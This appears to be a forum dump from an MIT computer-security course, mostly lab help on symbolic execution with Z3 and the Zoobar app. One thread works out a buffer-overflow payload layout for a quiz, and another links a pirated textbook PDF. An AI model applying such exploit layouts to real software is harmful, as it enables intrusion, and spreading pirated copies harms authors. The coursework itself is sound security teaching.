<div><p>thanks</p></div>
<h2>Staff Answer</h2>
<div><p>The late hours that each group has will be the <strong>max(each group member&#39;s late hours)</strong>. So if your group members have 3, 5, 7 hours left each, your group will have 7 hours that you can use. </p></div><hr><h1>Exercise  8 check takes a really really long time</h1>
<h3>2018-04-12T20:00:47Z</h3>
<div><p>It&#39;s been running for more than 10 minutes and still hasn&#39;t gotten to exercise 9 yet... is this normal or am I doing something wrong?</p>
<p>Exercise 6 doesn&#39;t really take that long to check, so I&#39;m pretty sure it&#39;s not a KVM thing.</p></div>
<h2>Student Answer</h2>
<div>8 takes less than a minute for me on KVM :/</div>
<h2>Followup</h2>
<div><p>I figured it out. It was actually something off about how I checked my branch conditions in concolic_exec function. Thanks! </p></div><hr><h1>Exercise 9.</h1>
<h3>2018-04-11T02:22:25Z</h3>
<div><p>I&#39;m only getting 87 iterations with concolic_execs. </p>
<p></p>
<p>I never see an instance where the number of zoobars changes in either person&#39;s account (by checking print statements inserted into the test_stuff function). Either concolic_exec isn&#39;t finding the right paths or I&#39;m just printing out the wrong values. How are we supposed to access values after conolic_execs performs it&#39;s work in the function. I assume zoobar.app(envrion, startresp) was doing the call to zoobar with whatever inputs conoclic_execs found. Is that wrong?</p></div>
<h2>Staff Answer</h2>
<div><p>You can observe those value from &#96;typescript&#96; file output after you run <br />script -c ./check-symex-zoobar.py<br /><br />I guess that this content is what you are looking for<br />Trying concrete value: {&#39;referrer&#39;: &#39;&#39;, &#39;form_recipient_present&#39;: 31L, &#39;rsplit_cookie_val_#_l&#39;: &#39;bob&#39;, &#39;cookie_name&#39;: &#39;PyZoobarLogin&#39;, &#39;cookie_val&#39;: &#39;bob#btok&#39;, &#39;form_zoobars_present&#39;: 32L, &#39;rsplit_cookie_val_#_r&#39;: &#39;btok&#39;, &#39;cookie&#39;: &#39;PyZoobarLogin=bob#btok&#39;, &#39;path&#39;: &#39;fer&#39;, &#39;form_recipient_val&#39;: &#39;a\x0e&#39;, &#39;form_zoobars_val&#39;: &#39;-1&#39;}<br /><br />You might find grep command with ... lines before and after &#34;error&#34; or &#34;warning&#34; useful for finding detailed action shown above.</p></div><hr><h1>Should we modify secfs-server?</h1>
<h3>2018-04-11T01:34:44Z</h3>
<div>In lab 5, are we allowed/required to modify secfs/bin/secfs-server?

And a related question: should version structure lists be stored as files in the SUNDR file system, or as a separate state of the server?</div>
<h2>Staff Answer</h2>
<div><p>(answered offline, but summarize here)<br /><br />Lab 5 is more open-ended and there are design choices to be made, so you are allowed / most likely required to modify secfs/bin/secfs-server. </p>
<p></p>
<p>For version structure lists, based on the SUNDR paper, how do you think the VSL&#39;s are stored? (feel free to ask if there are more questions on this)</p></div>
<h2>Followup</h2>
<div><p>I thought VSLs were stored in the client? since server is untrusted</p></div>
<h3>Followup Response</h3>
<div><p>Yes, the server is untrusted, how do we detect if something is wrong with VSLs in SUNDR? </p></div><hr><h1>Make check fails</h1>
<h3>2018-04-11T00:35:16Z</h3>
<div><p>My laptop (Mac) broke and I have to temporarily use a different machine (Windows) to finish up lab 3. I downloaded the Windows VMware Workstation, downloaded&#43;unzipped my lab3a submission, and tried to run make check. I got the following error:</p>
<p></p>
<p>./check_lab3.py<br />make: execvp: ./check_lab3.py: Permission denied<br />Makefile:15: recipe for target &#39;check&#39; failed<br />make: *** [check] Error 127</p>
<p></p>
<p>I get the same error if I use sudo. My 3a submission worked fine on my old computer. How do I fix this?</p></div>
<h2>Student Answer</h2>
<div><p>In case anyone else has this issue besides the op--</p>
<p>This was fixed by pulling the lab3 repo from github and then moving the changed files over; not all of the files were included in the zip as was found in <a href="https://www.piazza.com/class/javuduq1qek22s?cid=460" target="_blank">&#64;460</a></p></div>
<h2>Followup</h2>
<div><p>How do you pull the lab3 repo from github? I&#39;m having trouble with my vm and I think I need to restart in a new vm. </p></div><hr><h1>Regrade Request</h1>
<h3>2018-04-09T16:32:22Z</h3>
<div><p>I have a few questions about my Quiz 1 grade. Who should I give me quiz to so they can review it?</p>
<p></p>
<p>Thanks!</p></div>
<h2>Student Answer</h2>
<div><p>Where did you view your exam?</p></div>
<h2>Followup</h2>
<div><p><img src="https://d1b10bmlvqabco.cloudfront.net/attach/javuduq1qek22s/jfsi2pxjkop3tw/jfsiev78l03l/spongebob.jpg" alt="" /></p></div>
<h2>Staff Answer</h2>
<div><p>1. The initials of who graded each question is under the marks on the front page, try finding the grader for the question that you want to request a regrade for. </p>
<p></p>
<p>2. For picking up quizzes: &#64;409</p></div><hr><h1>Quiz 1 2018, Q5</h1>
<h3>2018-04-09T01:01:15Z</h3>
<div><p>I think the answer in the solution key is wrong. Shouldn&#39;t it be:</p>
<p></p>
<p>First, 1024 bytes of “A”, minus the length of cwd (i.e. /home/httpd). Then, 0xBCBCBCBC, Then, <strong>4 “A”s</strong> (because this is the where the return address of unlink would be located, which is 4 bytes long). Then we’re at the arguments to http_serve(). The first argument comes first, so put “<strong>0xBF BF F5 98</strong>” (this address is different than the one in the solution key because now we’re using 4 A’s instead of 16. Then, “/home/httpd/grades.txt” with the null terminating byte.</p>
<p> </p>
<p>Is this correct or am I missing something?</p>
<p></p>
<p></p>
<p>Also, what&#39;s the point breakdown for this question. I lost 4 points for what seems like a small detail, so I&#39;m kind of curious.</p></div>
<h2>Student Answer</h2>
<div><p>In a 32 bit system, chars are 1 byte and pointers are 4 bytes. So  between xBCBCBCBC (which is where handler is located) and fd (the argument that needs to be rewritten to a pointer to your name) you have:</p>
<p></p>
<p>8 bytes between the end of handler and the ebp (based on the info given to us in the question)</p>
<p>4 bytes for the ebp pointer </p>
<p>4 bytes for the return address of http_serve</p>
<p></p>
<p>and then fd is above the return address, which means you need 4 &#43; 4 &#43; 8 = 16 A&#39;s between handler and fd. </p>
<p></p>
<p>They decide to put &#34;/homes/httpd/grades.txt&#34; right after fd, which means it is 8 bytes (4 bytes return address pointer, 4 byte fd int) after the return address -&gt; xBF FF F5 9c &#43; 8 = xBF FF F5 A4</p></div><hr><h1>Quiz 1 2018, 3B</h1>
<h3>2018-04-09T00:05:14Z</h3>
<div><p>Just curious about this question.</p>
<p></p>
<p>I didn&#39;t know the answer, but I circled True because I thought Paul Youn suggested devising a threat model (focusing on particular attacks) when designing a defense for a system like AirBnB. If the answer is False, what did he recommend instead?</p>
<p></p>
<p>Thanks!</p></div>
<h2>Staff Answer</h2>
<div>Design the system based on assets instead.</div>
<h2>Followup</h2>
<div><p>Could you give some of examples of assets? Did he mean money/data that belongs to AirBnB and AirBnB&#39;s users?</p></div>
<h3>Followup Response</h3>
<div>Yeah emails, passwords, logs, user private information are some examples of assets. For AirBNB all of the above apply plus also things like house addresses and phone numbers (unless you book a house, for reasons relevant to how they handle their business)</div>
<h3>Followup Response</h3>
<div><p>Cool. Thanks!</p></div><hr><h1>Does the grader run sudo make check or just make check?</h1>
<h3>2018-04-08T23:18:07Z</h3>
<div><p>I&#39;m passing all tests in lab 3, but only if I run</p>
<pre>sudo make check</pre>
<p>rather than just</p>
<pre>make check</pre>
<p>Is this ok? Or should I wade through the permissions to figure out why this is?</p></div>
<h2>Followup</h2>
<div><p>Related Question:<br /><br />For exercise 10, it says not to edit &#96;zoobar/&#96; so that previous test cases still work. Does it matter which version of &#96;zoobar/&#96; is running? In other words, does it need to be the code we wrote in lab2 which uses the server/client files? Or as long as &#96;make check&#96; passes all test cases, then what is in &#96;zoobar/&#96; is fine?  </p></div>
<h2>Followup</h2>
<div><p>Did you end up merging your lab2 and lab3?  I&#39;m curious if that&#39;s what&#39;s requiring sudo, due to privilege separation?</p></div>
<h3>Followup Response</h3>
<div><p>yea, I think lab2 permissions messed up the permissions of make</p></div>
<h2>Staff Answer</h2>
<div><p>Just in case this is the issue, remember to NOT merge your lab 2 code into lab 3. </p>
<p></p>
<p>From the instructions near the top of the lab: </p>
<pre>WARNING: do not merge your lab 2 solutions into the lab 3 source code! Our basic symbolic execution system cannot track symbolic constraints across RPC between multiple processes, so we will focus on using symbolic execution on a non-privilege-separated Zoobar site. The symbolic execution system will also help us find bugs that privilege separation does not fully mitigate.</pre>
<p></p></div>
<h2>Followup</h2>
<div><p>Can you please just answer the question? </p></div>
<h3>Followup Response</h3>
<div><p>&#43;&#43;</p></div><hr><h1>Ex 9: figuring out which user gave the request?</h1>
<h3>2018-04-07T20:02:55Z</h3>
<div><p></p><pre>If a user u does not issue any requests to Zoobar, u&#39;s Zoobar balance should not shrink. (That is, it should be impossible for requests by one user to steal another user&#39;s zoobars.)</pre>
<p>How do we figure out which user issued the request, inside Ex 9?</p>
<p></p>
<p>transfer.py uses </p>
<p>g.user.person.username</p>
<p></p>
<p></p></div>
<h2>Followup</h2>
<div><p>I figure that the sender is contained in the cookie, but I don&#39;t know how Flask works so I can&#39;t figure out what the cookie should be formatted like.</p></div>
<h2>Student Answer</h2>
<div><p>resolved</p></div>
<h2>Followup</h2>
<div><p>Not resolved for me! Mind sharing what you found?</p></div>
<h3>Followup Response</h3>
<div><p>It&#39;s not something you know a priori, you need to actually run the web server and look at the cookie (document.cookie).</p></div>
<h3>Followup Response</h3>
<div><p>Thanks!</p></div>
<h3>Followup Response</h3>
<div><p>Wait what is this about cookies? I just checked the transactions DB and I passed the tests ... </p></div>
<h3>Followup Response</h3>
<div><p>I didn&#39;t use the cookie either.</p></div>
<h3>Followup Response</h3>
<div><p>would explain difference in number of iterations</p></div>
<h3>Followup Response</h3>
<div><p>So if you don&#39;t use cookie, how do you figure out which user gave the transaction?</p>
<p></p>
<p>What if, say, Alice sent a request &#34;transfer 1 to Bob&#34;</p>
<p></p>
<p>and then in the database you see</p>
<p></p>
<p>Bob becomes 9, Alice becomes 11</p>
<p></p>
<p>then it looks identical to Bob sending &#34;transfer 1 to Alice&#34;</p>
<p></p>
<p>without the cookie you can&#39;t tell the difference</p></div>
<h3>Followup Response</h3>
<div><p>so if the implementation was backwards, you wouldn&#39;t be able to tell that it&#39;s wrong...</p></div>
<h3>Followup Response</h3>
<div><p>Rather than looking at individual transactions, you can make general assertions about what will never happen. From the spec: &#34;If a user <tt>u</tt> does not issue any requests to Zoobar, <tt>u</tt>&#39;s Zoobar balance should not shrink.&#34;</p></div>
<h3>Followup Response</h3>
<div><p>I mean, how do you know which user u issues the request though?</p>
<p></p>
<p>Do you add assertions to the zoobar code itself, rather than the concolic executor script?</p></div>
<h3>Followup Response</h3>
<div><p>The assertion should hold for all such users u. I did this where is says to put Exercise 9 code.</p></div>
<h3>Followup Response</h3>
<div><p>I meant you don&#39;t know which user issued the request.</p>
<p></p>
<p>You can just say for all u,<strong> if u does not issue any requests...</strong></p>
<p></p>
<p></p>
<p>because you don&#39;t know if u issued the request.</p>
<p></p></div>
<h2>Followup</h2>
<div><p>Can instructor confirm only asserting on the Transaction database is sufficient? </p></div>
<h3>Followup Response</h3>
<div><p>would be nice to get instructor input</p></div><hr><h1>Confirming that lab submission works</h1>
<h3>2018-04-06T21:30:34Z</h3>
<div><p>Just to be sure my lab was working, I redownloaded it from the submit site, then scp-ed it over to my vm. Running make check from this downloaded folder failed, but running it from the folder I ran make submit-a on works fine.</p>
<p></p>
<p>Is this normal?</p></div>
<h2>Staff Answer</h2>
<div><p>That seems strange. Were there any errors when you dod make prepare-submit?</p></div>
<h2>Followup</h2>
<div><p>Nope, everything seems to work pre submit...</p>
<p></p>
<p><img src="https://d1b10bmlvqabco.cloudfront.net/attach/javuduq1qek22s/iebp61xtyvpd2/jfohw6ebz4qu/Screen_Shot_20180406_at_6.01.19_PM.png" alt="" /></p>
<p></p>
<p></p>
<p>Unzipping this file in my vm and running make check gives me this error:</p>
<p></p>
<p>Traceback (most recent call last):<br /> File &#34;int-avg.py&#34;, line 3, in &lt;module&gt;<br /> import symex.z3str<br /> File &#34;/home/httpd/symex/z3str.py&#34;, line 17, in &lt;module&gt;<br /> z3strlib = z3.z3core.lib()<br /> File &#34;/home/httpd/symex/z3py/z3core.py&#34;, line 28, in lib<br /> init(l)<br /> File &#34;/home/httpd/symex/z3py/z3core.py&#34;, line 34, in init<br /> _lib = ctypes.CDLL(PATH)<br /> File &#34;/usr/lib/python2.7/ctypes/__init__.py&#34;, line 362, in __init__<br /> self._handle = _dlopen(self._name, mode)<br />OSError: /home/httpd/symex/libz3str.so: cannot open shared object file: No such file or directory<br />ERROR: running shell command: python int-avg.py &gt;/tmp/lab3.log<br />Makefile:15: recipe for target &#39;check&#39; failed</p></div>
<h3>Followup Response</h3>
<div><p>note: I accidentally unzipped the contents into my home folder instead of making a separate folder for it, but it should still work right..?</p></div>
<h3>Followup Response</h3>
<div><p>Well... that error should be fixed if you have libz3str.so in that directory?</p></div>
<h3>Followup Response</h3>
<div><p>libz3str.so exists in the directory pre-zip, but make prepare-submit-a omits it when it creates the zip file</p></div>
<h3>Followup Response</h3>
<div><p>Yeah it&#39;s fine. We will have it in the correct directory when we grade it.</p></div>
<h3>Followup Response</h3>
<div><p>okay, thanks!</p></div><hr><h1>Lecture 15</h1>
<h3>2018-04-06T20:26:34Z</h3>
<div><p>When will the questions for this lecture be posted?</p></div>
<h2>Staff Answer</h2>
<div><p>Posted it.</p></div><hr><h1>Exercise 9: Exactly 139 iterations?</h1>
<h3>2018-04-06T02:09:33Z</h3>
<div><p>I&#39;m getting 143 for my initial output, and I&#39;m not sure whether this indicates that I have an error I need to go back and fix or not.</p></div>
<h2>Student Answer</h2>
<div><p>I think it’s probably fine. I got 171 and I was able to pass all of the tests.</p></div>
<h2>Followup</h2>
<div><p>same, 143</p></div>
<h2>Staff Answer</h2>
<div><p>I also got 143. No need to fix.<br />I&#39;m not sure about why getting as many as 171 but as long as you pass all tests; it should be fine :). </p></div>
<h2>Followup</h2>
<div><p>75 here. not sure if it&#39;s an issue</p></div>
<h3>Followup Response</h3>
<div><p>75 might be a bit off. Do you pass all the test for lab3?</p></div><hr><h1>import error?</h1>
<h3>2018-04-06T02:03:58Z</h3>
<div><p>suddenly im running make check and im getting an import error &#34;ImportError: No module named z3&#34;. i dont think i added anything that would cause this. how do i fix this? thanks.</p></div>
<h2>Student Answer</h2>
<div><p>nvm</p></div><hr><h1>Exercise 8 Eval Injection Not Found</h1>
<h3>2018-04-05T15:00:12Z</h3>
<div><p>I&#39;m confused by the test for this one. It passes the first two ex 8 tests but then fails the eval injection not found...</p></div>
<h2>Student Answer</h2>
<div><p>Resolved. Exercise 8 continues past the box. This is referring to the part after I thought was in ex 9</p></div><hr><h1>Exercise 9 - stopping after 4 iterations</h1>
<h3>2018-04-05T03:18:44Z</h3>
<div><p>I&#39;m working on exercise 9 and, unlike the printout in response to:</p>
<p></p>
<pre>script -c ./check-symex-zoobar.py</pre>
<p>my code stops after 4 iterations rather than 139.  Any hints as to what I might be missing?  Thanks!</p>
<p></p></div>
<h2>Staff Answer</h2>
<div><p>Exercise 9 is using concolic_execs from Exercise 6, so maybe try debugging from there? It sounds like your code isn&#39;t branching / trying inputs enough. A suggestion might be to check that you are producing inputs correctly for the next iteration. </p>
<p></p>
<p>If you suspect that it is because ok_names is not complete, maybe look at where the next iteration&#39;s ok_names argument is coming from. At which point of the code do you affect the next iteration&#39;s run? </p></div><hr><h1>Wield behavior of z3 (Challenge)</h1>
<h3>2018-04-04T20:47:38Z</h3>
<div><p>The signed integer arithmatics are really wield in z3.</p>
<p></p>
<p>I tried</p>
<p></p>
<pre>div2 = a / 2<br />mod2 = a % 2<br />do_check(&#34;ttt&#34;, z3.And(a == -5, div2 == -2, mod2 == 1))</pre>
<p>The result is SAT.</p>
<p></p>
<p>It basically says in Z3</p>
<pre>-5 / 2 = -2<br />-5 % 2 = 1<br />BUT -2 * 2 &#43; 1 = -3 !!!</pre>
<p></p>
<p>It doesn&#39;t make much sense to me. </p>
<p></p>
<p>In python</p>
<pre>-5 / 2 = -3<br />-5 % 2 = 1<br />-3 * 2 &#43; 1 = -5</pre>
<p>In C&#43;&#43;</p>
<pre>-5 / 2 = -2<br />-5 % 2 = -1<br />-2 * 2 &#43; -1 = -5</pre>
<p></p></div>
<h2>Staff Answer</h2>
<div><p>Z3&#39;s signed modulo operator, which you get using &#96;%&#96; in Python, is different from the signed remainder operator, which you can get using &#96;z3.SRem&#96;.</p>
<p></p>
<p>The difference is that with signed modulo, the sign of the result follows the divisor (2 in your example), and with signed remainder, the sign of the result follows the sign of the dividend (-5 in your example).</p></div><hr><h1>Corrections from the recitation</h1>
<h3>2018-04-04T18:06:19Z</h3>
<div><p>I think there were a couple of things mentioned during the recitation today that were incorrect:</p>
<p></p>
<ul><li>The SOP and forms: When demoing a CSRF attack, the recitation instructor mentioned that it was necessary to create a form on the attacker&#39;s webpage to send the request, because a request from a script would be blocked by the same-origin policy. In fact, there isn&#39;t actually anything special about forms versus scripts as far as the same-origin policy is concerned. A script on a malicious webpage could also send a request to a victim webpage directly, without needing to create a form. The same-origin policy would prevent the script from <em>reading the response</em> to the request, but it wouldn&#39;t prevent the request from being sent in the first place.</li><li>CSRF tokens: The recitation instructor mentioned that websites usually associate a CSRF token with a session, and serve the same token for each request until the user logs out. In fact, most websites today serve a different randomly-generated token on every request (usually by adding a digital signature to the token to avoid needing to store everything). This is a mitigation for the <a href="https://en.wikipedia.org/wiki/BREACH" target="_blank">BREACH</a> attack, where an attacker could exploit a timing side-channel from JavaScript to guess CSRF tokens on a victim site, by sending multiple requests and measuring how the contents of any given CSRF token would affect HTTP compression.</li></ul></div>
<h2>Followup</h2>
<div><p>1. This suggests the request would be blocked:</p>
<p></p>
<p><a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29">https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)</a></p>
<p></p>
<p>And I&#39;m having mixed results in my browser, but you could be right.</p>
<p></p>
<p>2. Indeed, there are several ways to implement CSRF tokens. Django&#39;s CSRF protection, for example, seems to use a random value that changes every time the user logs in, in addition to a salt:</p>
<p></p>
<p><a href="https://docs.djangoproject.com/en/2.0/ref/csrf/">https://docs.djangoproject.com/en/2.0/ref/csrf/</a></p></div>
<h3>Followup Response</h3>
<div><p>Thanks for the reply. As a demonstration of (1), you can run this in the console:</p>
<p></p>
<pre>await fetch(&#39;https://example.com&#39;, {method: &#39;POST&#39;, mode: &#39;no-cors&#39;})</pre>
<p>This will send a POST request to &#96;https://example.com&#96;, which can be verified by looking at the Network tab in Chrome. However, the response object provided by the browser is &#34;opaque&#34;, so it can&#39;t be read by the page that sent the request in accordance with the SOP.</p></div><hr><h1>Outdated OWASP</h1>
<h3>2018-04-04T16:39:20Z</h3>
<div><p>Just curious, is there a reason that we&#39;re reading 2013&#39;s OWASP top 10 instead of the <a href="https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf" target="_blank">list from 2017</a>? I haven&#39;t checked to see what&#39;s different in each, but are the 2013 ones more relevant for our lab 4?</p></div>
<h2>Staff Answer</h2>
<div><p>Thanks for catching that!  I&#39;ve updated to the 2017 OWASP list.</p></div><hr><h1>Exercise 2 const_int instead of concolic_int?</h1>
<h3>2018-04-04T14:51:18Z</h3>
<div><p>Are the operands in the constraint supposed to be const_int? I&#39;ve spent days trying to debug this exercise, but it keeps not working. It seems that the constraint is (12 == 70) == False</p>
<p>Unfortunately, that means the NOT of the constraint is impossible, since (12 == 70 )== False is always true. I don&#39;t know why it uses const_int, instead of concolic_int, but I didn&#39;t change anything. Is this expected?</p>
<p></p>
<pre>    print type(y)
    fp = fuzzy.cur_path_constr[0]
    print (fp, fp.a, fp.a.a, fp.a.a.i, fp.a.b, fp.a.b.i, fp.b, fp.b.b)
    (ok, model) = fuzzy.fork_and_check(fuzzy.sym_not(fuzzy.cur_path_constr[0]))
    print (ok, model)
&lt;class &#39;symex.fuzzy.concolic_int&#39;&gt;
(&lt;symex.fuzzy.sym_eq object at 0xb6635dec&gt;, &lt;symex.fuzzy.sym_eq object at 0xb6635e0c&gt;, &lt;symex.fuzzy.const_int object at 0xb7afcc8c&gt;, 12, &lt;symex.fuzzy.const_int object at 0xb7b023cc&gt;, 70, &lt;symex.fuzzy.const_bool object at 0xb6635e2c&gt;, False)
(unsat, {})</pre>
<p></p></div>
<h2>Staff Answer</h2>
<div><p>Saw your private post. Will discuss there.</p></div>
<h2>Student Answer</h2>
<div><p>resolved</p></div><hr><h1>Exercise 6</h1>
<h3>2018-04-03T20:49:31Z</h3>
<div><p>How do we know the ok_names parameter for concolic_find_input() inside concolic_exec(). The example only has i&#39;s but how do we find it in general. Or do we need to do that?</p></div>
<h2>Staff Answer</h2>
<div><p>Yes you will need to figure out ok_names to pass to the concolic_find_input()<br /><br />First as you said it example of ok_names is &#39;i&#39; in one of the example, so this is the variable name in concolic type.<br />Then, try to think about what variable in concolic_execs() can provide you that infomation. <br />If you can&#39;t fully understand all variables purely based on the description and documentation, consider observing the value inside by printing out and see if you can figure out. </p></div>
<h2>Followup</h2>
<div><p>do we need to extract it from the constraint?</p></div>
<h3>Followup Response</h3>
<div><p>found it</p></div>
<h2>Followup</h2>
<div><p>Can someone give a pointer for how to extract it from constraint? I was looking at constraint.args but it doesn&#39;t seem to work.</p></div>
<h3>Followup Response</h3>
<div><p>Hmm it&#39;s not in the constraint. Think more carefully about what ok_names is and what other variables mean.</p></div><hr><h1>Lab2 Grades Posted</h1>
<h3>2018-04-03T13:52:56Z</h3>
<div><p>Hi everyone, </p>
<p></p>
<p>The lab2 grades have been posted. I&#39;ve already reached out to those who have had problems with their submissions. </p>
<p></p>
<p>However, if you want a regrade or did not receive a grade, please email <a href="mailto:6.858-staff&#64;pdos.csail.mit.edu">6.858-staff&#64;pdos.csail.mit.edu</a> by 4/10, and we will figure a time to meet.</p>
<p></p>
<p>One thing to note is that you could only get extra credit for doing one challenge, so your grade was not higher if you did more challenges, i.e. the maximum score is 107. </p>
<p></p>
<p>Frank</p>
<p></p></div>
<h2>Followup</h2>
<div><p>Should we have gotten any feedback for challenge problems if they didn&#39;t get credit for some reason? I did one for Lab 2, but don&#39;t seem to have received credit for it.</p></div>
<h3>Followup Response</h3>
<div><p>Please email the staff list with more details. If it&#39;s challenge 3, it&#39;s possible that the grading script didn&#39;t trigger a manual review to look at the challenge. Please email us with more details. </p></div><hr><h1>signed integer average extra credit</h1>
<h3>2018-04-03T05:14:18Z</h3>
<div><p>Hi, i tried this exercise for a while couldn&#39;t get it. I was wondering if I could get a hint on how to approach this. I read most of the chapter linked from the Hacker&#39;s Delight book <a href="http://www.hackersdelight.org/basics2.pdf,">http://www.hackersdelight.org/basics2.pdf,</a> and used the integer average stuff to figure out the unsigned integer average. I&#39;m thinking that I could probe the msb to see if a signed integer is negative (b/c it would be in two&#39;s complement, but i don&#39;t know how to do that in z3)</p></div>
<h2>Student Answer</h2>
<div><p>Once Z3 has found a model <tt>m</tt> that fails, you can use <tt>m.eval(expr)</tt> to look into the values for this model, e.g <tt>m.eval(real_s_avg)</tt>, <tt>m.eval(a ^ b)</tt>, etc.</p>
<p>I also found it useful to restrict the bit vectors to be of smaller size, for debugging purposes.</p></div><hr><h1>Exercise 5</h1>
<h3>2018-04-02T08:25:13Z</h3>
<div><p>I&#39;m trying to get the test for exercise 5 to pass. The error I&#39;m getting is &#34;Missing some cases for g: set([&#39;Found the xyxy double&#39;])&#34;.  I have tried printing out a lot things and now I&#39;m really not sure how to debug it anymore since I don&#39;t see anything wrong with the few lines of code that I added. What could have gone wrong here?</p></div>
<h2>Student Answer</h2>
<div><p>Resolved. Thanks to &#64;430</p></div><hr><h1>Exercise 10</h1>
<h3>2018-04-01T20:42:16Z</h3>
<div><p>I&#39;m having a little bit of a struggle reading through the typescript and figuring out what exactly is causing the balance mismatch or theft. Essentially I&#39;m not sure how to understand the input or the sequence of actions that could be leading to this in the first place.</p></div>
<h2>Staff Answer</h2>
<div><p>This is just one example approach that you could use: </p>
<p></p>
<p>You could try to render the html to look at the request page that led to the error. For this, you could always create a .html file and open that in a browser, or alternatively use an online editor like <a href="https://html-online.com/editor/">https://html-online.com/editor/</a>. From here, try to figure out what was the action that was taken, what should be the correct outcome and what went wrong.</p></div><hr><h1>fuzzy.py output</h1>
<h3>2018-04-01T04:52:40Z</h3>
<div><p>I can&#39;t seem to find any of the print statements output I put in fuzzy.py. They don&#39;t show up on the terminal screen and are not in /tmp/lab3.log either.</p></div>
<h2>Student Answer</h2>
<div><p>op here.</p>
<p>Nvm, check_lab3.py overwrites lab3.log after each set of tests.</p></div><hr><h1>What is a caller?</h1>
<h3>2018-04-01T03:41:11Z</h3>
<div><p>What exactly does a caller does? In concolic_exec(), the comments say &#34;where caller is the corresponding value from the list of call sites returned by concolic_find_input (i.e., branch_callers).&#34; but there is no branch_caller variable in concolic_find_input?</p>
<p></p></div>
<h2>Staff Answer</h2>
<div><p>If you print out branch_callers in concolic_execs, you&#39;ll see that it looks something like </p>
<p></p>
<p>[(&#39;./check-symex-int.py&#39;, 8), (&#39;./check-symex-int.py&#39;, 10), (&#39;./check-symex-int.py&#39;, 12), (&#39;./check-symex-int.py&#39;, 14), (&#39;./check-symex-int.py&#39;, 16)]</p>
<p></p>
<p>So it is a tuple pair of the file and the line number that was branching. </p>
<p></p>
<p>It isn&#39;t used in concolic_find_input, but it is an argument for concolic_force_branch. </p></div><hr><h1>When are questions due?</h1>
<h3>2018-04-01T00:58:15Z</h3>
<div><p>It&#39;s really late to be asking this, but when are lecture questions and answers due? Is it by the time the lecture starts, 1pm? Because I know for other systems classes sometimes the questions are due 10pm the night before.</p></div>
<h2>Student Answer</h2>
<div><p>Before lecture.</p></div>
<h2>Followup</h2>
<div><p>For 824 it&#39;s due 11:59 the day before. But for 858 it&#39;s before lecture.</p></div><hr><h1>integer average question</h1>
<h3>2018-03-31T18:18:32Z</h3>
<div><p>In the Hacker&#39;s Delight book on pg.19, there are some suggestions</p>
<p>for how to do integer average without overflowing some fixed width integer.</p>
<p>I implemented one of them, since they have both the floor and ceiling of the </p>
<p>average. It passed the test because it is not the same as the original </p>
<p>overflowing average, but i&#39;m not entirely convinced that my implementation is right.</p>
<p>Which of these two approaches are correct, if either are?</p></div>
<h2>Student Answer</h2>
<div><p>You don&#39;t want floor or ceiling. You want truncated.</p>
<p></p>
<pre>floor(3/2) = 1<br />floor(-3/2) = -2
ceil(3/2) = 2<br />ceil(-3/2) = -1
trunc(3/2) = 1<br />trunc(-3/2) = -1</pre>
<p></p></div><hr><h1>Overflowing the cookie jar?</h1>
<h3>2018-03-31T03:50:48Z</h3>
<div><p>What does that mean? Is this a euphemism for buffer overflow?</p></div>
<h2>Student Answer</h2>
<div><p>Not sure how much this helps, but what I found from googling: https://security.stackexchange.com/questions/12412/what-cookie-attacks-are-possible-between-computers-in-related-dns-domains-exa</p></div><hr><h1>PDF of The Tangled Web</h1>
<h3>2018-03-30T04:27:07Z</h3>
<div><p>Does anyone have a PDF of the reading for MW that they could link to, or know of an easy way to get one from books24x7 (I can&#39;t find a generate PDF button)? Thanks!</p></div>
<h2>Student Answer</h2>
<div><p></p><p><a href="https://cdn.fbsbx.com/v/t59.2708-21/11812986_677819339020840_1273432981_n.pdf/Michal-Zalewski-The-tangled-Web_-a-guide-to-securing-modern-Web-applications-No-Starch-Press-2011.pdf?_nc_cat=0&amp;oh=635f0d6e5767a6d26204de1a8ca220f8&amp;oe=5AC05217&amp;dl=1">https://cdn.fbsbx.com/v/t59.2708-21/11812986_677819339020840_1273432981_n.pdf/Michal-Zalewski-The-tangled-Web_-a-guide-to-securing-modern-Web-applications-No-Starch-Press-2011.pdf?_nc_cat=0&amp;oh=635f0d6e5767a6d26204de1a8ca220f8&amp;oe=5AC05217&amp;dl=1</a></p></div><hr><h1>Exercise 7:  Missing some cases for g: set([&#39;Found the xyxy double&#39;])</h1>
<h3>2018-03-29T22:12:09Z</h3>
<div><p>For the  check-symex-str.py test for Exercise 7, I&#39;m getting the error </p>
<p></p>
<p>Missing some cases for g: set([&#39;Found the xyxy double&#39;])</p>
<p></p>
<p>But how is this test relevant to the code we implemented for Exercise 7, since addition and equality were already implemented in the lab? </p></div>
<h2>Student Answer</h2>
<div><p>It&#39;s not directly relevant to what you did in ex 7, but if you&#39;re failing it, it most likely means something from ex. 3-6 is still incorrect.</p></div>
<h2>Followup</h2>
<div><p>My code correctly generates the condition : </p>
<p></p>
<p>And(Contains(s, &#34;abc&#34;) == False,<br />(s == &#34;&#34;) == False,<br />(Length(s) &gt; 30) == False,<br />Not((Concat(s, s) == &#34;xyxy&#34;) == False),<br />StartsWith(s, &#34;start&#34;) == False,<br />EndsWith(s, &#34;end&#34;) == False,<br />Not(Length(s) &lt; 4) == False)</p>
<p></p>
<p>However when  concolic_find_input() is called on the contraint, </p>
<p></p>
<pre>(ok, model) = fork_and_check(constraint)<br />print(&#34;model&#34;, str(model), ok)<br />Output: (&#39;model&#39;, &#39;{}&#39;, unsat)</pre>
<p></p>
<p>So it looks like fork_and_check can&#39;t generate an input, even though it should be able to. Thus no inputs are generated for Not((Concat(s, s) == &#34;xyxy&#34;) == False) so the the test fails. I don&#39;t know how fork_and_check was implemented, so I don&#39;t know how to debug this further. Am I using the method incorrectly? </p></div>
<h3>Followup Response</h3>
<div><p>Hmm.. I&#39;m also confused about why it&#39;s not generating an input for that constraint (looks satisfiable to me... maybe a TA can help out?), but your constraint looks strange. I feel like you made the same mistake I did. Look at ex 5 again?</p></div>
<h3>Followup Response</h3>
<div><p>(As another hint, here are some of the constraints I&#39;m generating for check-symex-str.py)<br /><br />&#96;&#96;&#96;</p>
<p>And(Contains(s, &#34;abc&#34;) == False,</p>
<p>    (s == &#34;&#34;) == False,</p>
<p>    Not((Length(s) &gt; 30) == False))</p>
<p>And(Contains(s, &#34;abc&#34;) == False,</p>
<p>    (s == &#34;&#34;) == False,</p>
<p>    (Length(s) &gt; 30) == False)</p>
